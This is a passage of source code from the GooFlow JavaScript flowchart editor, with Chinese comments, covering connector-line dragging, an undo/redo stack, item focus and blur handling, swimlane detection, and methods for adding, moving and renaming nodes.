if(lineEnd){\r\n\t\t\t\t\tif(GooFlow.prototype.useSVG!==\"\"){\r\n\t\t\t\t\t\tline.childNodes[0].setAttribute(\"d\",\"M \"+X+\" \"+Y+\" L \"+lineEnd.x+\" \"+lineEnd.y);\r\n\t\t\t\t\t\tline.childNodes[1].setAttribute(\"d\",\"M \"+X+\" \"+Y+\" L \"+lineEnd.x+\" \"+lineEnd.y);\r\n\t\t\t\t\t\tif(line.childNodes[1].getAttribute(\"marker-end\")==='url(\"#arrow2\")')\r\n\t\t\t\t\t\t\tline.childNodes[1].setAttribute(\"marker-end\",\"url(#arrow3)\");\r\n\t\t\t\t\t\telse\tline.childNodes[1].setAttribute(\"marker-end\",\"url(#arrow2)\");\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse\tline.points.value=X+\",\"+Y+\" \"+lineEnd.x+\",\"+lineEnd.y;\r\n\t\t\t\t}\r\n\t\t\t});\r\n\t\t\tthis.$workArea.mouseup({inthis:this},function(e){\r\n\t\t\t\tvar This=e.data.inthis;\r\n\t\t\t\tif((This.$nowType!==\"direct\"&&This.$nowType!==\"dashed\")&&!This.$mpTo.data(\"p\"))\treturn;\r\n\t\t\t\tvar tmp=document.getElementById(\"GooFlow_tmp_line\");\r\n\t\t\t\tif(tmp){\r\n\t\t\t\t\t$(this).css(\"cursor\",\"auto\").removeData(\"lineStart\").removeData(\"lineEnd\");\r\n\t\t\t\t\tThis.$mpTo.hide().removeData(\"p\");\r\n\t\t\t\t\tThis.$mpFrom.hide().removeData(\"p\");\r\n\t\t\t\t\tThis.$draw.removeChild(tmp);\r\n\t\t\t\t\tThis.focusItem(This.$focus,false);\r\n\t\t\t\t}else{\r\n\t\t\t\t\tThis.$lineOper.removeData(\"tid\");\r\n\t\t\t\t}\r\n\t\t\t});\r\n\r\n\t\t\tthis.$textArea=$(\"<textarea></textarea>\");\r\n\t\t\tthis.$bgDiv.append(this.$textArea);\r\n\t\t\tthis.$lineMove=$('<div class=\"GooFlow_linemove\" style=\"display:none\"></div>');//操作折线时的移动框\r\n\t\t\tthis.$workArea.append(this.$lineMove);\r\n\t\t\tthis.$lineMove.on(\"mousedown\",{inthis:this},function(e){\r\n\t\t\t\tif(e.button===2)return false;\r\n\t\t\t\tvar lm=$(this);\r\n\t\t\t\tlm.css({\"background-color\":\"#333\"});\r\n\t\t\t\tvar This=e.data.inthis;\r\n\t\t\t\tvar ev=_mouseP(e),t=_elCsys(This.$workArea[0]);\r\n\t\t\t\tvar X,Y;\r\n\t\t\t\tX=ev.x-t.left+This.$workArea[0].parentNode.scrollLeft;\r\n\t\t\t\tY=ev.y-t.top+This.$workArea[0].parentNode.scrollTop;\r\n\t\t\t\tvar p=This.$lineMove.position();\r\n\t\t\t\tvar vX=X-p.left,vY=Y-p.top;\r\n\t\t\t\tvar isMove=false;\r\n\t\t\t\tdocument.onmousemove=function(e){\r\n\t\t\t\t\tif(!e)e=window.event;\r\n\t\t\t\t\tvar ev=_mouseP(e);\r\n\t\t\t\t\t//var ps=This.$lineMove.position();\r\n\t\t\t\t\tX=ev.x-t.left+This.$workArea[0].parentNode.scrollLeft;\r\n\t\t\t\t\tY=ev.y-t.top+This.$workArea[0].parentNode.scrollTop;\r\n\t\t\t\t\tif(This.$lineMove.data(\"type\")===\"lr\"){\r\n\t\t\t\t\t\tX=X-vX;\r\n\t\t\t\t\t\tif(X<0)\tX=0;\r\n\t\t\t\t\t\telse if(X>This.$workArea.width())\r\n\t\t\t\t\t\t\tX=This.$workArea.width();\r\n\t\t\t\t\t\tThis.$lineMove.css({left:X+\"px\"});\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse if(This.$lineMove.data(\"type\")===\"tb\"){\r\n\t\t\t\t\t\tY=Y-vY;\r\n\t\t\t\t\t\tif(Y<0)\tY=0;\r\n\t\t\t\t\t\telse if(Y>This.$workArea.height())\r\n\t\t\t\t\t\t\tY=This.$workArea.height();\r\n\t\t\t\t\t\tThis.$lineMove.css({top:Y+\"px\"});\r\n\t\t\t\t\t}\r\n\t\t\t\t\tisMove=true;\r\n\t\t\t\t};\r\n\t\t\t\tdocument.onmouseup=function(){\r\n\t\t\t\t\tif(isMove){\r\n\t\t\t\t\t\tvar p=This.$lineMove.position();\r\n\t\t\t\t\t\tif(This.$lineMove.data(\"type\")===\"lr\")\r\n\t\t\t\t\t\t\tThis.setLineM(This.$lineMove.data(\"tid\"),(p.left+3)/This.$scale);\r\n\t\t\t\t\t\telse if(This.$lineMove.data(\"type\")===\"tb\")\r\n\t\t\t\t\t\t\tThis.setLineM(This.$lineMove.data(\"tid\"),(p.top+3)/This.$scale);\r\n\t\t\t\t\t}\r\n\t\t\t\t\tThis.$lineMove.css({\"background-color\":\"transparent\"});\r\n\t\t\t\t\tif(This.$focus===This.$lineMove.data(\"tid\")){\r\n\t\t\t\t\t\tThis.focusItem(This.$lineMove.data(\"tid\"));\r\n\t\t\t\t\t}\r\n\t\t\t\t\tdocument.onmousemove=null;\r\n\t\t\t\t\tdocument.onmouseup=null;\r\n\t\t\t\t};\r\n\t\t\t});\r\n\r\n\t\t\t//选定一条转换线后出现的浮动操作栏，有改变线的样式和删除线等按钮。\r\n\t\t\tthis.$lineOper=$(\"<div class='GooFlow_line_oper' style='display:none'><i class='b_l1'></i><i class='b_l2'></i><i class='b_l3'></i><i class='b_x'></i></div>\");//选定线时显示的操作框\r\n\t\t\tthis.$workArea.parent().append(this.$lineOper);\r\n\t\t\tthis.$lineOper.on(\"click\",{inthis:this},function(e){\r\n\t\t\t\tif(!e)e=window.event;\r\n\t\t\t\tif(e.target.tagName!==\"I\")\treturn;\r\n\t\t\t\tvar This=e.data.inthis;\r\n\t\t\t\tvar id=$(this).data(\"tid\");\r\n\t\t\t\tswitch($(e.target).attr(\"class\")){\r\n\t\t\t\t\tcase \"b_x\":\r\n\t\t\t\t\t\tThis.delLine(id);\r\n\t\t\t\t\t\tthis.style.display=\"none\";break;\r\n\t\t\t\t\tcase \"b_l1\":\r\n\t\t\t\t\t\tThis.setLineType(id,\"lr\");break;\r\n\t\t\t\t\tcase \"b_l2\":\r\n\t\t\t\t\t\tThis.setLineType(id,\"tb\");break;\r\n\t\t\t\t\tcase \"b_l3\":\r\n\t\t\t\t\t\tThis.setLineType(id,\"sl\");break;\r\n\t\t\t\t}\r\n\t\t\t});\r\n\t\t\t//新增移动线两个端点至新的结点功能移动功能，这里要提供移动用的DOM\r\n\t\t\tthis.$mpFrom=$(\"<div class='GooFlow_line_mp' style='display:none'></div>\");\r\n\t\t\tthis.$mpTo=$(\"<div class='GooFlow_line_mp' style='display:none'></div>\");\r\n\t\t\tthis.$workArea.append(this.$mpFrom).append(this.$mpTo);\r\n\t\t\tthis._initLinePointsChg();\r\n\r\n\t\t\tif(useOperStack){//如果要使用堆栈记录操作并提供“撤销/重做”的功能,只在编辑状态下有效\r\n\t\t\t\tthis.$undoStack=[];\r\n\t\t\t\tthis.$redoStack=[];\r\n\t\t\t\tthis.$isUndo=0;\r\n\t\t\t\t///////////////以下是构造撤销操作/重做操作的方法\r\n\t\t\t\t//检查撤销栈与重做栈处理好头部按钮的显示\r\n\t\t\t\tthis._checkStack=function(type){\r\n\t\t\t\t\tif(this.$head===null)\treturn;\r\n\t\t\t\t\tif(!type || type==='undo'){\r\n\t\t\t\t\t\tif(this.$undoStack.length===0){\r\n\t\t\t\t\t\t\tthis.$head.find(\".ico_undo\").parent().addClass(\"a_disabled\");\r\n\t\t\t\t\t\t}else{\r\n\t\t\t\t\t\t\tthis.$head.find(\".ico_undo\").parent().removeClass(\"a_disabled\");\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t}\r\n\t\t\t\t\tif(!type || type==='redo'){\r\n\t\t\t\t\t\tif(this.$redoStack.length===0){\r\n\t\t\t\t\t\t\tthis.$head.find(\".ico_redo\").parent().addClass(\"a_disabled\");\r\n\t\t\t\t\t\t}else{\r\n\t\t\t\t\t\t\tthis.$head.find(\".ico_redo\").parent().removeClass(\"a_disabled\");\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t}\r\n\t\t\t\t};\r\n\t\t\t\t//为了节省浏览器内存空间,undo/redo中的操作缓存栈,最多只可放50步操作;超过50步时,将自动删掉最旧的一个缓存\r\n\t\t\t\tthis.pushOper=function(funcName,paras){\r\n\t\t\t\t\tif(this.$isUndo===1){\r\n\t\t\t\t\t\tthis.$redoStack.push([funcName,paras]);\r\n\t\t\t\t\t\tthis.$isUndo=0;\r\n\t\t\t\t\t\tif(this.$redoStack.length>50)\tthis.$redoStack.shift();\r\n\t\t\t\t\t\tthis._checkStack('redo');\r\n\t\t\t\t\t}else{\r\n\t\t\t\t\t\tthis.$undoStack.push([funcName,paras]);\r\n\t\t\t\t\t\tif(this.$undoStack.length>50)\tthis.$undoStack.shift();\r\n\t\t\t\t\t\tif(this.$isUndo===0){\r\n\t\t\t\t\t\t\tthis.$redoStack.splice(0,this.$redoStack.length);\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\tthis.$isUndo=0;\r\n\t\t\t\t\t\tthis._checkStack();\r\n\t\t\t\t\t}\r\n\t\t\t\t};\r\n\t\t\t\t//将外部的方法加入到GooFlow对象的事务操作堆栈中,在过后的undo/redo操作中可以进行控制，一般用于对流程图以外的附加信息进行编辑的事务撤销/重做控制；\r\n\t\t\t\t//传参func为要执行方法对象,jsonPara为外部方法仅有的一个面向字面的JSON传参,由JSON对象带入所有要传的信息；\r\n\t\t\t\t//提示:为了让外部方法能够被UNDO/REDO,需要在编写这些外部方法实现时,加入对该方法执行后效果回退的另一个执行方法的pushExternalOper\r\n\t\t\t\tthis.pushExternalOper=function(func,jsonPara){\r\n\t\t\t\t\tthis.pushOper(\"externalFunc\",[func,jsonPara]);\r\n\t\t\t\t};\r\n\t\t\t\t//撤销上一步操作\r\n\t\t\t\tthis.undo=function(){\r\n\t\t\t\t\tif(this.$undoStack.length===0)\treturn;\r\n\t\t\t\t\tthis.blurItem();\r\n\t\t\t\t\tvar tmp=this.$undoStack.pop();\r\n\t\t\t\t\tthis.$isUndo=1;\r\n\t\t\t\t\tif(tmp[0]===\"externalFunc\"){\r\n\t\t\t\t\t\ttmp[1][0](tmp[1][1]);\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse{\r\n\t\t\t\t\t\t//传参的数量,最小0个最多12个.\r\n\t\t\t\t\t\tthis[tmp[0]](tmp[1][0],tmp[1][1],tmp[1][2],tmp[1][3],tmp[1][4],tmp[1][5],\r\n\t\t\t\t\t\t\ttmp[1][6],tmp[1][7],tmp[1][8],tmp[1][9],tmp[1][10],tmp[1][11]);\r\n\t\t\t\t\t}\r\n\t\t\t\t\tthis._checkStack();\r\n\t\t\t\t};\r\n\t\t\t\t//重做最近一次被撤销的操作\r\n\t\t\t\tthis.redo=function(){\r\n\t\t\t\t\tif(this.$redoStack.length===0)\treturn;\r\n\t\t\t\t\tthis.blurItem();\r\n\t\t\t\t\tvar tmp=this.$redoStack.pop();\r\n\t\t\t\t\tthis.$isUndo=2;\r\n\t\t\t\t\tif(tmp[0]===\"externalFunc\"){\r\n\t\t\t\t\t\ttmp[1][0](tmp[1][1]);\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse{\r\n\t\t\t\t\t\t//传参的数量,最小0个最多12个.\r\n\t\t\t\t\t\tthis[tmp[0]](tmp[1][0],tmp[1][1],tmp[1][2],tmp[1][3],tmp[1][4],tmp[1][5],\r\n\t\t\t\t\t\t\ttmp[1][6],tmp[1][7],tmp[1][8],tmp[1][9],tmp[1][10],tmp[1][11]);\r\n\t\t\t\t\t}\r\n\t\t\t\t\tthis._checkStack();\r\n\t\t\t\t};\r\n\t\t\t}\r\n\t\t\t$(document).keydown({inthis:this},function(e){\r\n\t\t\t\t//绑定键盘操作\r\n\t\t\t\tvar This=e.data.inthis;\r\n\t\t\t\tif(This.$focus===\"\")return;\r\n\t\t\t\tswitch(e.keyCode){\r\n\t\t\t\t\tcase 46://删除\r\n\t\t\t\t\t\tThis.delNode(This.$focus,true);\r\n\t\t\t\t\t\tThis.delLine(This.$focus);\r\n\t\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t});\r\n\t\t},\r\n\r\n\t\t//对头部栏自定义按钮的事件绑定，用户可用来对另行加入的头部按钮自定义功能\r\n\t\t//传参为json结构，key为按钮的类型名(需另行写好'ico_'+按钮类型名的样式类定义)，value为相关事件的方法实现定义\r\n\t\tbindHeadBtnEvent:function(funcs){\r\n\t\t\tif(this.$head!=null)\r\n\t\t\t\tthis.$headBtnEvents=funcs;\r\n\t\t},\r\n\t\t//每一种类型结点及其按钮的说明文字\r\n\t\tsetNodeRemarks:function(remark){\r\n\t\t\tif(this.$tool==null)  return;\r\n\t\t\tthis.$tool.children(\"a\").each(function(){\r\n\t\t\t\ttry{\r\n\t\t\t\t\tthis.title=remark[$(this).attr(\"id\").split(\"btn_\")[1]];\r\n\t\t\t\t}catch(e){}\r\n\t\t\t});\r\n\t\t},\r\n\t\t//(当有顶部工具栏按钮组时)设定顶部工具栏按钮的说明文字\r\n\t\tsetHeadToolsRemarks:function(remark){\r\n\t\t\tif(this.$head==null)  return;\r\n\t\t\tthis.$head.children(\"a\").each(function(){\r\n\t\t\t\ttry{\r\n\t\t\t\t\tthis.title=remark[$(this).children(\"i\").attr(\"class\").split('ico_')[1]];\r\n\t\t\t\t}catch(e){}\r\n\t\t\t});\r\n\t\t},\r\n\t\t//设定扩展工作区宽高的长条按钮的说明文字\r\n\t\tsetExtWorkRemarks:function(remark){\r\n\t\t\tthis.$workArea.children(\".Gooflow_extend_right\").attr(\"title\",remark.extendRight);\r\n\t\t\tthis.$workArea.children(\".Gooflow_extend_bottom\").attr(\"title\",remark.extendBottom);\r\n\t\t},\r\n\r\n\t\t//切换左边工具栏按钮,传参TYPE表示切换成哪种类型的按钮\r\n\t\tswitchToolBtn:function(type){\r\n\t\t\tif(this.$tool!=null){\r\n\t\t\t\tthis.$tool.children(\"#\"+this.$id+\"_btn_\"+this.$nowType.split(\" \")[0]).attr(\"class\",\"GooFlow_tool_btn\");\r\n\t\t\t}\r\n\t\t\tif(this.$nowType===\"group\"){\r\n\t\t\t\tthis.$workArea.prepend(this.$group);\r\n\t\t\t\tfor(var k in this.$areaDom)\tthis.$areaDom[k].addClass(\"lock\").children(\"div:eq(1)\").css(\"display\",\"none\");\r\n\t\t\t}\r\n\t\t\tthis.$nowType=type;\r\n\t\t\tif(this.$tool!=null){\r\n\t\t\t\tthis.$tool.children(\"#\"+this.$id+\"_btn_\"+type.split(\" \")[0]).attr(\"class\",\"GooFlow_tool_btndown\");\r\n\t\t\t}\r\n\t\t\tif(this.$nowType===\"group\"){\r\n\t\t\t\tthis.blurItem();\r\n\t\t\t\tthis.$workArea.append(this.$group);\r\n\t\t\t\tfor(var key in this.$areaDom)\tthis.$areaDom[key].removeClass(\"lock\").children(\"div:eq(1)\").css(\"display\",\"\");\r\n\t\t\t}else if(this.$nowType===\"direct\"||this.$nowType===\"dashed\"){\r\n\t\t\t\tthis.blurItem();\r\n\t\t\t}\r\n\t\t\tif(this.$textArea&&this.$textArea.css(\"display\")===\"none\")\tthis.$textArea.removeData(\"id\").val(\"\").hide();\r\n\t\t},\r\n\r\n\t\t//获取结点/连线/分组区域的详细信息\r\n\t\tgetItemInfo:function(id,type){\r\n\t\t\tswitch(type){\r\n\t\t\t\tcase \"node\":\treturn this.$nodeData[id]||null;\r\n\t\t\t\tcase \"line\":\treturn this.$lineData[id]||null;\r\n\t\t\t\tcase \"area\":\treturn this.$areaData[id]||null;\r\n\t\t\t}\r\n\t\t},\r\n\t\t//取消所有结点/连线被选定的状态\r\n\t\tblurItem:function(){\r\n\t\t\tif(this.$focus!==\"\"){\r\n\t\t\t\tvar jq=$(\"#\"+this.$focus);\r\n\t\t\t\tif(jq.prop(\"tagName\")===\"DIV\"){\r\n\t\t\t\t\tif(typeof this.onItemBlur==='function' && this.onItemBlur(this.$focus,\"node\")===false)\treturn false;\r\n\t\t\t\t\tjq.removeClass(\"item_focus\").children(\"div:eq(0)\").css(\"display\",\"none\");\r\n\t\t\t\t\tif(this.$nodeData[this.$focus].marked){\r\n\t\t\t\t\t\tjq.addClass(\"item_mark\").css(\"border-color\",GooFlow.color.mark);\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t\telse{\r\n\t\t\t\t\tif(typeof this.onItemBlur==='function' && this.onItemBlur(this.$focus,\"line\")===false)\treturn false;\r\n\t\t\t\t\tif(GooFlow.prototype.useSVG!==\"\"){\r\n\t\t\t\t\t\tif(!this.$lineData[this.$focus].marked){\r\n\t\t\t\t\t\t\tjq[0].childNodes[1].setAttribute(\"stroke\",GooFlow.color.line);\r\n\t\t\t\t\t\t\tjq[0].childNodes[1].setAttribute(\"marker-end\",\"url(#arrow1)\");\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse{\r\n\t\t\t\t\t\tif(!this.$lineData[this.$focus].marked){\r\n\t\t\t\t\t\t\tjq[0].strokeColor=GooFlow.color.line;\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t}\r\n\t\t\t\t\tif(this.$editable){\r\n\t\t\t\t\t\tthis.$lineMove.hide().removeData(\"type\").removeData(\"tid\");\r\n\t\t\t\t\t\tthis.$lineOper.hide().removeData(\"tid\");\r\n\t\t\t\t\t\tthis.$mpFrom.hide().removeData(\"p\");\r\n\t\t\t\t\t\tthis.$mpTo.hide().removeData(\"p\");\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tthis.$focus=\"\";\r\n\t\t\treturn true;\r\n\t\t},\r\n\t\t//选定某个结点/转换线 bool:TRUE决定了要触发选中事件，FALSE则不触发选中事件，多用在程序内部调用。\r\n\t\tfocusItem:function(id,bool){\r\n\t\t\tvar jq=$(\"#\"+id);\r\n\t\t\tif(jq.length===0)\treturn;\r\n\t\t\tif(!this.blurItem())\treturn;//先执行\"取消选中\",如果返回FLASE,则也会阻止选定事件继续进行.\r\n\t\t\tif(bool&& typeof this.onItemFocus==='function' && this.onItemFocus(id,\"node\")===false)\treturn;\r\n\t\t\tthis.$focus=id;\r\n\t\t\tif(jq.prop(\"tagName\")===\"DIV\"){\r\n\t\t\t\tjq.addClass(\"item_focus\");\r\n\t\t\t\tif(GooFlow.color.line){\r\n\t\t\t\t\tjq.css(\"border-color\",GooFlow.color.line);\r\n\t\t\t\t}\r\n\t\t\t\tif(this.$editable)jq.children(\"div:eq(0)\").css(\"display\",\"block\");\r\n\t\t\t\t//this.$workArea.append(jq);\r\n\t\t\t}else{//如果是连接线\r\n\t\t\t\tif(GooFlow.prototype.useSVG!==\"\"){\r\n\t\t\t\t\tjq[0].childNodes[1].setAttribute(\"stroke\",GooFlow.color.mark);\r\n\t\t\t\t\tjq[0].childNodes[1].setAttribute(\"marker-end\",\"url(#arrow2)\");\r\n\t\t\t\t}\r\n\t\t\t\telse{\r\n\t\t\t\t\tjq[0].strokeColor=GooFlow.color.mark;\r\n\t\t\t\t}\r\n\t\t\t\tif(!this.$editable)\treturn;\r\n\t\t\t\tvar x,y,from,to,n;\r\n\t\t\t\tif(GooFlow.prototype.useSVG!==\"\"){\r\n\t\t\t\t\tfrom=jq.attr(\"from\").split(\",\");\r\n\t\t\t\t\tto=jq.attr(\"to\").split(\",\");\r\n\t\t\t\t\tn=[from[0],from[1],to[0],to[1]];\r\n\t\t\t\t}else{\r\n\t\t\t\t\tn=jq[0].getAttribute(\"fromTo\").split(\",\");\r\n\t\t\t\t\tfrom=[n[0],n[1]];\r\n\t\t\t\t\tto=[n[2],n[3]];\r\n\t\t\t\t}\r\n\t\t\t\tfrom[0]=parseInt(from[0],10);\r\n\t\t\t\tfrom[1]=parseInt(from[1],10);\r\n\t\t\t\tto[0]=parseInt(to[0],10);\r\n\t\t\t\tto[1]=parseInt(to[1],10);\r\n\t\t\t\t//var t=_elCsys(this.$workArea[0]);\r\n\t\t\t\tif(this.$lineData[id].type===\"lr\"){\r\n\t\t\t\t\tfrom[0]=this.$lineData[id].M*this.$scale;\r\n\t\t\t\t\tto[0]=from[0];\r\n\r\n\t\t\t\t\tthis.$lineMove.css({\r\n\t\t\t\t\t\twidth:\"5px\",height:(to[1]-from[1])*(to[1]>from[1]? 1:-1)+\"px\",\r\n\t\t\t\t\t\tleft:from[0]-3+\"px\",\r\n\t\t\t\t\t\ttop:(to[1]>from[1]? from[1]:to[1])+1+\"px\",\r\n\t\t\t\t\t\tcursor:\"e-resize\",display:\"block\"\r\n\t\t\t\t\t}).data({\"type\":\"lr\",\"tid\":id});\r\n\t\t\t\t}\r\n\t\t\t\telse if(this.$lineData[id].type===\"tb\"){\r\n\t\t\t\t\tfrom[1]=this.$lineData[id].M*this.$scale;\r\n\t\t\t\t\tto[1]=from[1];\r\n\t\t\t\t\tthis.$lineMove.css({\r\n\t\t\t\t\t\twidth:(to[0]-from[0])*(to[0]>from[0]? 1:-1)+\"px\",height:\"5px\",\r\n\t\t\t\t\t\tleft:(to[0]>from[0]? from[0]:to[0])+1+\"px\",\r\n\t\t\t\t\t\ttop:from[1]-3+\"px\",\r\n\t\t\t\t\t\tcursor:\"s-resize\",display:\"block\"\r\n\t\t\t\t\t}).data({\"type\":\"tb\",\"tid\":id});\r\n\t\t\t\t}\r\n\t\t\t\tx=(from[0]+to[0])/2-40;\r\n\t\t\t\ty=(from[1]+to[1])/2+4;\r\n\t\t\t\tthis.$lineOper.css({display:\"block\",left:x+\"px\",top:y+\"px\"}).data(\"tid\",id);\r\n\t\t\t\tif(this.$editable){\r\n\t\t\t\t\tthis.$mpFrom.css({display:\"block\",left:n[0]-4+\"px\",top:n[1]-4+\"px\"}).data(\"p\",n[0]+\",\"+n[1]);\r\n\t\t\t\t\tthis.$mpTo.css({display:\"block\",left:n[2]-4+\"px\",top:n[3]-4+\"px\"}).data(\"p\",n[2]+\",\"+n[3]);\r\n\t\t\t\t}\r\n\t\t\t\tthis.$draw.appendChild(jq[0]);\r\n\t\t\t}\r\n\r\n\t\t\tthis.switchToolBtn(\"cursor\");\r\n\t\t},\r\n\t\t//传入一个节点的ID，判断在图中的哪个区域组(泳道)的范围内\r\n\t\t_node2Area:function(nodeId){\r\n\t\t\tif(this.$group===null)\treturn;\r\n\t\t\tvar node=this.$nodeData[nodeId];\r\n\t\t\tvar lane=false;\r\n\t\t\tfor(var key in this.$areaData){\r\n\t\t\t\tvar area = this.$areaData[key];\r\n\t\t\t\tif( node.left>=area.left&&node.left<area.left+area.width &&\r\n\t\t\t\t\tnode.top>=area.top&&node.top<area.top+area.height\r\n\t\t\t\t){\r\n\t\t\t\t\tnode.areaId=key;\r\n\t\t\t\t\tlane=true;\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tif(!lane){\tdelete node.areaId;\t} //不属于任何区域组(泳道)的情况\r\n\t\t},\r\n\t\t//增加一个流程结点,传参为一个JSON,有id,name,top,left,width,height,type(结点类型)等属性\r\n\t\taddNode:function(id,json){\r\n\t\t\tif(typeof this.onItemAdd==='function' && this.onItemAdd(id,\"node\",json)===false)return;\r\n\t\t\tif(this.$undoStack&&this.$editable){\r\n\t\t\t\tthis.pushOper(\"delNode\",[id]);\r\n\t\t\t}\r\n\t\t\tvar mark=json.marked? \" item_mark\":\"\";\r\n\t\t\tif(json.type.indexOf(\" round\")<0){\r\n\t\t\t\tif(!json.width||json.width<104)json.width=104;\r\n\t\t\t\tif(!json.height||json.height<26)json.height=26;\r\n\t\t\t\tif(!json.top||json.top<0)json.top=0;\r\n\t\t\t\tif(!json.left||json.left<0)json.left=0;\r\n\r\n\t\t\t\tthis.$nodeDom[id]=$(\"<div class='GooFlow_item\"+mark+\"' id='\"+id+\"' style='top:\"+json.top*this.$scale+\"px;left:\"+json.left*this.$scale+\"px'><table cellspacing='1' style='width:\"+(json.width*this.$scale-2)+\"px;height:\"+(json.height*this.$scale-2)+\"px;'><tr><td class='ico'><i class='ico_\"+json.type+\"'></i></td><td><div>\"+json.name+\"</div></td></tr></table><div style='display:none'><div class='rs_bottom'></div><div class='rs_right'></div><div class='rs_rb'></div><div class='rs_close'></div></div></div>\");\r\n\t\t\t}\r\n\t\t\telse{\r\n\t\t\t\tjson.width=26;json.height=26;\r\n\t\t\t\tthis.$nodeDom[id]=$(\"<div class='GooFlow_item item_round\"+mark+\"' id='\"+id+\"' style='top:\"+json.top*this.$scale+\"px;left:\"+json.left*this.$scale+\"px'><table cellspacing='0' style='width:\"+(json.width*this.$scale-2)+\"px;height:\"+(json.height*this.$scale-2)+\"px;'><tr><td class='ico'><i class='ico_\"+json.type+\"'></i></td></tr></table><div  style='display:none'><div class='rs_close'></div></div><div class='span'>\"+json.name+\"</div></div>\");\r\n\t\t\t}\r\n\t\t\tif(GooFlow.color.node){\r\n\t\t\t\tif(json.type.indexOf(\" mix\")>-1){\r\n\t\t\t\t\tthis.$nodeDom[id].css({\"background-color\":GooFlow.color.mix,\"border-color\":GooFlow.color.mix});\r\n\t\t\t\t\tif(GooFlow.color.mixFont){\r\n\t\t\t\t\t\tthis.$nodeDom[id].find(\"td:eq(1)\").css(\"color\",GooFlow.color.mixFont);\r\n\t\t\t\t\t\tthis.$nodeDom[id].find(\".span\").css(\"color\",GooFlow.color.mixFont);\r\n\t\t\t\t\t}\r\n\t\t\t\t}else{\r\n\t\t\t\t\tthis.$nodeDom[id].css({\"background-color\":GooFlow.color.node,\"border-color\":GooFlow.color.node});\r\n\t\t\t\t}\r\n\t\t\t\tif(mark&&GooFlow.color.mark){\r\n\t\t\t\t\tthis.$nodeDom[id].css({\"border-color\":GooFlow.color.mark});\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tif(json.type.indexOf(\" mix\")>-1){\r\n\t\t\t\tthis.$nodeDom[id].addClass(\"item_mix\");\r\n\t\t\t}\r\n\r\n\t\t\tvar ua=navigator.userAgent.toLowerCase();\r\n\t\t\tif(ua.indexOf('msie')!==-1 && ua.indexOf('8.0')!==-1)\r\n\t\t\t\tthis.$nodeDom[id].css(\"filter\",\"progid:DXImageTransform.Microsoft.Shadow(color=#94AAC2,direction=135,strength=2)\");\r\n\t\t\tthis.$workArea.append(this.$nodeDom[id]);\r\n\t\t\tthis.$nodeData[id]=json;\r\n\t\t\t++this.$nodeCount;\r\n\t\t\tif(this.$editable){\r\n\t\t\t\tthis.$nodeData[id].alt=true;\r\n\t\t\t\tthis._node2Area(id);\r\n\t\t\t\tif(this.$deletedItem[id])\tdelete this.$deletedItem[id];//在回退删除操作时,去掉该元素的删除记录\r\n\t\t\t}\r\n\t\t},\r\n\t\t//移动结点到一个新的位置\r\n\t\tmoveNode:function(id,left,top){\r\n\t\t\tif(!this.$nodeData[id])\treturn;\r\n\t\t\tif(typeof this.onItemMove==='function' && this.onItemMove(id,\"node\",left,top)===false)\treturn;\r\n\t\t\tif(this.$undoStack){\r\n\t\t\t\tvar paras=[id,this.$nodeData[id].left,this.$nodeData[id].top];\r\n\t\t\t\tthis.pushOper(\"moveNode\",paras);\r\n\t\t\t}\r\n\t\t\tif(left<0)\tleft=0;\r\n\t\t\tif(top<0)\ttop=0;\r\n\t\t\t$(\"#\"+id).css({left:left*this.$scale+\"px\",top:top*this.$scale+\"px\"});\r\n\t\t\tthis.$nodeData[id].left=left;\r\n\t\t\tthis.$nodeData[id].top=top;\r\n\t\t\t//重画转换线\r\n\t\t\tthis.resetLines(id,this.$nodeData[id]);\r\n\t\t\tif(this.$editable){\r\n\t\t\t\tthis.$nodeData[id].alt=true;\r\n\t\t\t\tthis._node2Area(id);\r\n\t\t\t}\r\n\t\t},\r\n\t\t//设置结点/连线/分组区域的文字信息\r\n\t\tsetName:function(id,name,type){\r\n\t\t\tvar oldName;\r\n\t\t\tif(type===\"node\"){//如果是结点\r\n\t\t\t\tif(!this.$nodeData[id])\treturn;\r\n\t\t\t\tif(this.$nodeData[id].name===name)\treturn;\r\n\t\t\t\tif(typeof this.onItemRename==='function' && this.onItemRename(id,name,\"node\")===false)\treturn;\r\n\t\t\t\toldName=this.$nodeData[id].name;\r\n\t\t\t\tthis.$nodeData[id].name=name;\r\n\t\t\t\tif(this.$nodeData[id].type.indexOf(\"round\")>1){\r\n\t\t\t\t\tthis.$nodeDom[id].children(\".span\").text(name);\r\n\t\t\t\t}\r\n\t\t\t\telse{\r\n\t\t\t\t\tthis.$nodeDom[id].find(\"td:eq(1)\").children(\"div\").text(name);\r\n\r\n\t\t\t\t\tvar width=this.$nodeDom[id].outerWidth();\r\n\t\t\t\t\tvar height=this.$nodeDom[id].outerHeight();\r\n\t\t\t\t\tif(this.$nodeData[id].width!==width || this.$nodeData[id].height!==height){\r\n\t\t\t\t\t\tthis.$nodeDom[id].children(\"table\").css({width:width-2+\"px\",height:height-2+\"px\"});\r\n\t\t\t\t\t\tif(this.$undoStack){\r\n\t\t\t\t\t\t\tvar para=[id,this.$nodeData[id].width,this.$nodeData[id].height];\r\n\t\t\t\t\t\t\tthis.pushOper(\"resizeNode\",para);\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\tthis.$nodeData[id].width=width;\r\n\t\t\t\t\t\tthis.$nodeData[id].height=height;\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t\tif(this.$editable){\r\n\t\t\t\t\tthis.$nodeData[id].alt=true;\r\n\t\t\t\t}\r\n\t\t\t\t//重画转换线\r\n\t\t\t\tthis.resetLines(id,this.$nodeData[id]);\r\n\t\t\t}\r\n\t\t\telse 